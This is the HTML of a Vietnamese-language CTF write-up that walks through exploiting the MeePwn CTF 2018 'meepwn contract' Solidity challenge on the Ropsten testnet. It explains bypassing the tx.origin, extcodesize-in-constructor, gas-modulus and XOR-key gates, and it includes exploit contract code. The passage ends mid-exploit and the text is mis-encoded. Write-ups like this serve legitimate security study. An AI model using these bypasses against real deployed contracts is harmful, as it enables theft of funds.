<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) & !(IE 8)]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<title>MEEPWN CTF 2018 &#8211; meepwn contract | BabyPhD CTF Team</title>
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="https://babyphd.net/xmlrpc.php">
	<!--[if lt IE 9]>
	<script src="https://babyphd.net/wp-content/themes/twentythirteen/js/html5.js"></script>
	<![endif]-->
	<script type='text/javascript'>function ctSetCookie(c_name, value, def_value){document.cookie = c_name + '=' + escape(value) + '; path=/';}ctSetCookie('ct_checkjs', '1181016728', '0');</script><link rel='dns-prefetch' href='https://s0.wp.com/' />
<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
<link rel='dns-prefetch' href='https://s.w.org/' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Feed" href="../../../../feed/index.html" />
<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Comments Feed" href="../../../../comments/feed/index.html" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/babyphd.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='../../../../wp-includes/css/dist/block-library/style.min.css%3Fver=5.2.2.css' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='../../../../wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css%3Fver=3.1.css' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-style-css'  href='../../../../wp-content/themes/twentythirteen/style.css%3Fver=2013-07-18.css' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentythirteen-ie-css'  href='https://babyphd.net/wp-content/themes/twentythirteen/css/ie.css?ver=2013-07-18' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='social-logos-css'  href='../../../../wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css%3Fver=1.css' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css'  href='../../../../wp-content/plugins/jetpack/css/jetpack.css%3Fver=7.5.2.css' type='text/css' media='all' />
<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery.js%3Fver=1.12.4-wp'></script>
<script type='text/javascript' src='../../../../wp-includes/js/jquery/jquery-migrate.min.js%3Fver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js%3Fver=20190204'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ctPublic = {"_ajax_nonce":"a204603c59","_ajax_url":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/cleantalk-spam-protect/js/apbct-public.min.js%3Fver=5.122'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ctNocache = {"ajaxurl":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php","info_flag":"","set_cookies_flag":"","blog_home":"https:\/\/babyphd.net\/"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/cleantalk-spam-protect/js/cleantalk_nocache.min.js%3Fver=5.122'></script>
<link rel='https://api.w.org/' href='../../../../wp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../../xmlrpc.php%3Frsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../../../wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='MEEPWN CTF 2018 - XSS' href='../../../07/17/meepwn-ctf-2018-xss/index.html' />
<meta name="generator" content="WordPress 5.2.2" />
<link rel="canonical" href="index.html" />
<link rel='shortlink' href='https://wp.me/p72HMd-cr' />
<link rel="alternate" type="application/json+oembed" href="../../../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fbabyphd.net%252F2018%252F08%252F01%252Fmeepwn-ctf-2018-meepwn-contract%252F" />
<link rel="alternate" type="text/xml+oembed" href="../../../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fbabyphd.net%252F2018%252F08%252F01%252Fmeepwn-ctf-2018-meepwn-contract%252F&amp;format=xml" />

<link rel='dns-prefetch' href='https://v0.wordpress.com/'/>
<link rel='dns-prefetch' href='https://i0.wp.com/'/>
<link rel='dns-prefetch' href='https://i1.wp.com/'/>
<link rel='dns-prefetch' href='https://i2.wp.com/'/>
<style type='text/css'>img#wpstats{display:none}</style>		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
			<style type="text/css" id="twentythirteen-header-css">
			.site-header {
			background: url(../../../../wp-content/themes/twentythirteen/images/headers/star.png) no-repeat scroll top;
			background-size: 1600px auto;
		}
		@media (max-width: 767px) {
			.site-header {
				background-size: 768px auto;
			}
		}
		@media (max-width: 359px) {
			.site-header {
				background-size: 360px auto;
			}
		}
		</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="MEEPWN CTF 2018 - meepwn contract" />
<meta property="og:url" content="https://babyphd.net/2018/08/01/meepwn-ctf-2018-meepwn-contract/" />
<meta property="og:description" content="Source code cá»§a &#8220;gate&#8221;: pragma solidity ^0.4.18; contract Meepwn_Wire { address public entrant; constructor() { entrant = msg.sender; } function isAccountAddress(address addr) private râ€¦" />
<meta property="article:published_time" content="2018-08-01T12:47:31+00:00" />
<meta property="article:modified_time" content="2018-08-16T21:09:22+00:00" />
<meta property="og:site_name" content="BabyPhD CTF Team" />
<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="MEEPWN CTF 2018 - meepwn contract" />
<meta name="twitter:card" content="summary" />

<!-- End Jetpack Open Graph Tags -->
			<style type="text/css" id="wp-custom-css">
				code {
    padding: 2px 4px;
    margin: 0;
    border-radius: 2px;
    color: #222;
    background: #f2f4f5;
}			</style>
		</head>

<body class="post-template-default single single-post postid-771 single-format-standard sidebar">
	<div id="page" class="hfeed site">
		<header id="masthead" class="site-header" role="banner">
			<a class="home-link" href="../../../../index.html" title="BabyPhD CTF Team" rel="home">
				<h1 class="site-title">BabyPhD CTF Team</h1>
				<h2 class="site-description">NÃ³i chung Ä‘Ã¢y lÃ  má»™t khÃ¡i niá»‡m vÃ´ cÃ¹ng trá»«u tÆ°á»£ng</h2>
			</a>

			<div id="navbar" class="navbar">
				<nav id="site-navigation" class="navigation main-navigation" role="navigation">
					<button class="menu-toggle">Menu</button>
					<a class="screen-reader-text skip-link" href="index.html#content" title="Skip to content">Skip to content</a>
					<div id="primary-menu" class="nav-menu"><ul>
<li class="page_item page-item-2"><a href="../../../../ctf-wtf/index.html">CTF</a></li>
</ul></div>
					<form role="search" method="get" class="search-form" action="../../../../index.html">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form>				</nav><!-- #site-navigation -->
			</div><!-- #navbar -->
		</header><!-- #masthead -->

		<div id="main" class="site-main">

	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">

						
				
<article id="post-771" class="post-771 post type-post status-publish format-standard hentry category-misc category-smartcontract">
	<header class="entry-header">
		
				<h1 class="entry-title">MEEPWN CTF 2018 - meepwn contract</h1>
		
		<div class="entry-meta">
			<span class="date"><a href="index.html" title="Permalink to MEEPWN CTF 2018 - meepwn contract" rel="bookmark"><time class="entry-date" datetime="2018-08-01T12:47:31+00:00">August 1, 2018</time></a></span><span class="categories-links"><a href="../../../../category/misc/index.html" rel="category tag">misc</a>, <a href="../../../../category/smartcontract/index.html" rel="category tag">smartcontract</a></span><span class="author vcard"><a class="url fn n" href="../../../../author/vigov/index.html" title="View all posts by vigov5" rel="author">vigov5</a></span>					</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

		<div class="entry-content">
		<p><a href="https://scoreboard.meepwn.team/task" target="_blank" rel="noopener">https://scoreboard.meepwn.team/task</a></p>
<p><img class="medium-zoom-image" src="https://i0.wp.com/images.viblo.asia/fd265c3f-adf9-428b-8bee-30682193eff2.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/fd265c3f-adf9-428b-8bee-30682193eff2.png" data-recalc-dims="1" /></p>
<p>Source code cá»§a "gate":</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract Meepwn_Wire
<span class="token punctuation">{</span>
    address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">isAccountAddress</span><span class="token punctuation">(</span>address addr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token function">returns</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        uint x<span class="token punctuation">;</span>
        assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token keyword">return</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">exploitMe</span><span class="token punctuation">(</span>bytes8 _key<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">isAccountAddress</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>gas <span class="token operator">%</span> <span class="token number">1337</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span>_key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><span id="more-771"></span></p>
<p>Interface cá»§a contract chÃ­nh:</p>
<pre class="language-js"><code class="language-js">pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract MeePwnMain <span class="token punctuation">{</span>

  <span class="token keyword">function</span> <span class="token function">getNewInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token function">returns</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">function</span> <span class="token function">submitInstance</span><span class="token punctuation">(</span>string email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span><span class="token punctuation">(</span>bytes32<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>sau khi truy cáº­p Ä‘áº¿nÂ <a href="http://178.128.87.12/smart-contract" target="_blank" rel="noopener">http://178.128.87.12/smart-contract</a>Â nhá»¯ng viá»‡c báº¡n cáº§n lÃ m nhÆ° sau (hiá»‡n site Ä‘Ã£ khÃ´ng truy cáº­p Ä‘Æ°á»£c ná»¯a, mÃ¬nh xin phÃ©p tÃ³m táº¯t láº¡i theo...kÃ­ á»©c cá»§a mÃ¬nhÂ ğŸ˜„)</p>
<ul>
<li>Sáº½ cÃ³ má»™t contract chÃ­nh táº¡i Ä‘á»‹a chá»‰Â <a href="https://ropsten.etherscan.io/address/0x3da169ad88c8f419b57e181fe971b33993dfdc81" target="_blank" rel="noopener">0x3da169ad88c8f419b57e181fe971b33993dfdc81</a>Â Ä‘Æ°á»£c deploy trÃªn Testnet Ropsten</li>
<li>Báº¡n sáº½ gá»i hÃ mÂ <code>getNewInstance</code>Â chuyá»ƒn 0.1 ETH vÃ o Ä‘á»‹a chá»‰ nÃ y, contract chÃ­nh sáº½ deploy contractÂ <strong>Meepwn_Wire</strong>Â á»Ÿ trÃªn vÃ  gÃ¡nÂ <code>entrant = msg.sender</code>Â tá»©c lÃ  Ä‘á»‹a chá»‰ cá»§a contract chÃ­nh.</li>
<li>Nhiá»‡m vá»¥ cá»§a báº¡n lÃ m tháº¿ nÃ o Ä‘Ã³, dÃ¹ng hÃ mÂ <code>exploitMe</code>, vÆ°á»£t qua táº¥t cáº£ cÃ¡c "gate", set láº¡i biáº¿nÂ <code>entrant</code>Â thÃ nh Ä‘á»‹a chá»‰ cá»§a mÃ¬nh (pwned !)</li>
<li>Sau Ä‘Ã³ gá»i hÃ mÂ <code>submitInstance</code>Â kÃ¨m vá»›i email cá»§a mÃ¬nh Ä‘á»ƒ chá»©ng minh mÃ¬nh Ä‘Ã£ lÃ m Ä‘Æ°á»£c, Ä‘á»ƒ há»‡ thá»‘ng gá»­i flag vá» email mÃ  báº¡n submit.</li>
</ul>
<p>Vá» cÆ¡ báº£n, mÃ´ hÃ¬nh nÃ y khÃ¡ giá»‘ng vá»›iÂ <a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">Ethernaut</a>Â cá»¥ thá»ƒ hÆ¡n thÃ¬ báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm cÃ¡c bÃ i write-up cá»§a anhÂ <a href="https://viblo.asia/u/kiendinang" target="_blank" rel="noopener">@kiendinang</a>Â trÃªn Viblo, vá»›i nhiá»u cáº¥p Ä‘á»™ tá»« dá»… Ä‘áº¿n khÃ³.</p>
<h1 id="_walk-through-1">Walk Through</h1>
<p>MÃ¬nh xin tÃ³m táº¯t cÃ¡c bÆ°á»›c Ä‘á»ƒ vÆ°á»£t qua cÃ¡c gate nhÆ° sau:</p>
<h2 id="_gate-1-2">Gate 1</h2>
<p><code>require(msg.sender != tx.origin);</code>Â : Trong Solidity thÃ¬Â <code>msg.sender</code>Â lÃ  thá»©/ngÆ°á»i trá»±c tiáº¿p gá»i hÃ m cá»§a contract, cÃ²nÂ <code>tx.origin</code>Â lÃ  ngÆ°á»i táº¡o ra transaction. Do váº­yÂ <code>tx.origin</code>Â sáº½ luÃ´n lÃ  ngÆ°á»i dÃ¹ng, cÃ²nÂ <code>msg.sender</code>Â thÃ¬ cÃ³ thá»ƒ lÃ  ngÆ°á»i dÃ¹ng hoáº·c lÃ  má»™t contract khÃ¡c. Do váº­y ta cÃ³ mÃ´ hÃ¬nh sau:</p>
<pre class="language-none"><code class="language-none">A (ngÆ°á»i dÃ¹ng) -&gt; B (exploit contract) -&gt; C (Meepwn_Wire contract)
</code></pre>
<p>Vá»›i mÃ´ hÃ¬nh nÃ y sáº½ Ä‘áº£m báº£o Ä‘Æ°á»£cÂ <code>msg.sender != tx.origin</code></p>
<h2 id="_gate-2-3">Gate 2</h2>
<p><code>require(isAccountAddress(msg.sender));</code>Â : Gate nÃ y Ä‘Ãºng nhÆ° tÃªn hÃ m, kiá»ƒm tra xem Ä‘á»‹a chá»‰ Ä‘ang tÆ°Æ¡ng tÃ¡c vá»›i contract, cÃ³ pháº£i lÃ  ngÆ°á»i dÃ¹ng khÃ´ng hay lÃ  má»™t contract khÃ¡c ? vÃ Â <strong>Meepwn_Wire</strong>Â yÃªu cáº§uÂ <code>msg.sender</code>Â pháº£i lÃ  má»™t account ngÆ°á»i dÃ¹ng thÃ´ng qua viá»‡c kiá»ƒm tra storage cá»§a account cÃ³ chá»©a code hay khÃ´ng báº±ng Ä‘oáº¡n assembly (náº¿u Ä‘á»‹a chá»‰ lÃ  ngÆ°á»i dÃ¹ng thÃ¬ sáº½ codesize == 0, vÃ  ngÆ°á»£c láº¡i náº¿u Ä‘Ã³ lÃ  má»™t contract khÃ¡c)</p>
<pre class="language-js"><code class="language-js">assembly <span class="token punctuation">{</span> x <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>
</code></pre>
<p>Náº¿u váº­y, trick chÃºng ta dÃ¹ng á»Ÿ bÆ°á»›c 1 sáº½ fail ? Tuy nhiÃªn, cÃ³ má»™t thá»i Ä‘iá»ƒm mÃ  codesize cá»§a má»™t contract báº±ng 0, Ä‘Ã³ chÃ­nh lÃ  thá»i Ä‘iá»ƒm mÃ  contract Ä‘Æ°á»£c deploy (nÃ³i cÃ¡ch khÃ¡c, khi Ä‘ang cháº¡y contructor cá»§a contract), nhÆ° Ä‘Æ°á»£c note trongÂ <a href="https://github.com/ethereum/yellowpaper" target="_blank" rel="noopener">yellow paper</a>Â cá»§a Ethereum. Váº­y Ä‘á»ƒ pass qua gate nÃ y, ta cáº§n thá»±c hiá»‡n exploit trong contructor cá»§a contract. Äáº¿n Ä‘Ã¢y ta cÃ³ thá»ƒ xÃ¢y dá»±ng Ä‘Æ°á»£c contract táº¡m thá»i dÃ¹ng Ä‘á»ƒ exploit nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">exploitMe</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>vá»›i target lÃ  Ä‘á»‹a chá»‰ cá»§a contractÂ <code>Meepwn_Wire</code>Â mÃ  contract chÃ­nh Ä‘Ã£ deploy. Äá»ƒ biáº¿t Ä‘Æ°á»£c Ä‘á»‹a chá»‰ nÃ y, báº¡n cÃ³ thá»ƒ tÃ¬m Ä‘áº¿n transactionÂ <code>getNewInstance</code>Â trÃªnÂ <a href="https://ropsten.etherscan.io/" target="_blank" rel="noopener">https://ropsten.etherscan.io/</a>Â vÃ  kiá»ƒm tra tabÂ <code>Internal Transactions</code>.</p>
<h2 id="_gate-3-4">Gate 3</h2>
<p><code>require(msg.gas % 1337 == 0);</code>Â : Gate nÃ y yÃªu cáº§u sá»‘ gas cÃ²n láº¡i (<code>msg.gas</code>) táº¡i thá»i Ä‘iá»ƒm thá»±c hiá»‡n kiá»ƒm tra pháº£i chia háº¿t cho 1337. Äá»ƒ thá»±c hiá»‡n Ä‘iá»u nÃ y, ta cÃ³ thá»ƒ gá»i hÃ mÂ <code>exploitMe</code>Â theo cÃ¡ch sau:</p>
<pre class="language-js"><code class="language-js">t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token punctuation">)</span>
</code></pre>
<p>vá»›iÂ <code>xxx</code>Â lÃ  sá»‘ gas dÃ¹ng Ä‘á»ƒ cháº¡y hÃ mÂ <code>exploitMe</code>. NhÆ° váº­y chÃºng ta sáº½ control Ä‘Æ°á»£c sá»‘ gas truyá»n vÃ o. Váº­y truyá»n vÃ o bao nhiÃªu gas Ä‘á»ƒ thoáº£ mÃ£n ? MÃ¬nh sáº½ lÃ m theo cÃ¡ch thá»­ saim truyá»n vÃ o 1 sá»‘ gas tuá»³ Ã½, vÃ  kiá»ƒm tra instruction trÃªn Remix.</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span>exploitMe<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">98000</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>VÃ­ dá»¥ cháº¡y vá»›i gas 98000, cháº¯c cháº¯n transaction sáº½ fail, báº±ng sá»­ dá»¥ng mÃ´i trÆ°á»ng Javascript VM trÃªn Remix sáº½ cho phÃ©p chÃºng ta debug:<img class="medium-zoom-image" src="https://i2.wp.com/images.viblo.asia/a22a0df6-77f0-4920-b715-634fa749ffda.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/a22a0df6-77f0-4920-b715-634fa749ffda.png" data-recalc-dims="1" /></p>
<p>ClickÂ <code>Debug</code>, má»Ÿ pháº§nÂ <code>Instructions</code>Â vÃ Â <code>Stack</code>Â vÃ  step qua tá»«ng instruction cho Ä‘áº¿n Ä‘oáº¡n kiá»ƒm tra sá»‘ gas:</p>
<p><img class="medium-zoom-image" src="https://i1.wp.com/images.viblo.asia/bd209629-0feb-4b81-934e-bb8d9d5f8705.png?w=604&#038;ssl=1" alt="" data-zoom-target="https://images.viblo.asia/1600/bd209629-0feb-4b81-934e-bb8d9d5f8705.png" data-recalc-dims="1" /></p>
<p>IP hiá»‡n Ä‘ang á»Ÿ 363, ngay sau khi chÃºng ta cháº¡y xongÂ <code>GAS</code>, top stack lÃºc nÃ y sáº½ chÃ­nh lÃ  sá»‘ gas cÃ²n láº¡i:Â <code>0x17abc = 96956</code>Â (táº¡i ngÄƒn tiáº¿p theo chÃ­nh lÃ  giÃ¡ trá»‹Â <code>0x539</code>Â = 1337). Váº­y ta sáº½ cÃ³ gas thoáº£ mÃ£n lÃ :</p>
<pre class="language-none"><code class="language-none">98000 - 96956 % 1337 = 97308
</code></pre>
<p><strong>Note</strong>: Äá»ƒ Ä‘áº£m báº£o debug Ä‘Ãºng thÃ¬ version compiler vÃ  thiáº¿t láº­p optimize cá»§a báº¡n vÃ  Ä‘á» bÃ i pháº£i giá»‘ng nhau, ráº¥t may, Ä‘á»u Ä‘ang lÃ  versionÂ <code>soljson-v0.4.24+commit.e67f0147.js</code>Â ğŸ˜„, cÆ¡ mÃ  náº¿u cÃ³ sai thÃ¬ cÅ©ng sai khÃ¡c nhau khÃ´ng quÃ¡ 100 gas, chÃºng ta cÃ³ thá»ƒ brute-force Ä‘Æ°á»£cÂ ğŸ˜†</p>
<h2 id="_gate-4-5">Gate 4</h2>
<p><code>require(uint64(_key) ^ uint64(sha3(msg.sender)) ^ uint64(sha3(address(this))) == 0x13371337);</code>Â : gate nÃ y lÃ  khÃ¡ Ä‘Æ¡n giáº£n (tuy nhiÃªn trong thá»i gian thi BTC Ä‘Ã£ khÃ´ng may Ä‘eploy nháº§m source code Ä‘oáº¡n nÃ y khiáº¿n cÃ¡c Ä‘á»™i thi tá»‘n cá»¡ "1 tiáº¿ng" tÃ¬m cÃ¡ch brute-force 8 bytes sha3 (náº¿u thá»±c sá»± cÃ³ team Ä‘á»‹nh lÃ m váº­yÂ ğŸ˜…)), Ä‘Ã¢y lÃ  phÃ©p XOR vÃ  chÃºng ta lÃ m láº¡i nhÆ° sau:</p>
<pre class="language-js"><code class="language-js">_key <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x13371337</span><span class="token punctuation">)</span>

</code></pre>
<p><code>this</code>Â á»Ÿ Ä‘Ã¢y sáº½ cho ra Ä‘á»‹a chá»‰ contract exploit cá»§a chÃºng ta.</p>
<h2 id="_full-exploit-6">Full Exploit</h2>
<p>(Test thá»­ trÃªn Remix trÆ°á»›c cho cháº¯c Äƒn rá»“i hÃ£y submit nhÃ©)</p>
<pre class="language-js"><code class="language-js">contract HackMeepwn_Wire <span class="token punctuation">{</span>
    
    address <span class="token keyword">public</span> target <span class="token operator">=</span> <span class="token number">0x9a6210545c23d287496c518564b3db5f3efb2918</span><span class="token punctuation">;</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Meepwn_Wire t <span class="token operator">=</span> <span class="token function">Meepwn_Wire</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
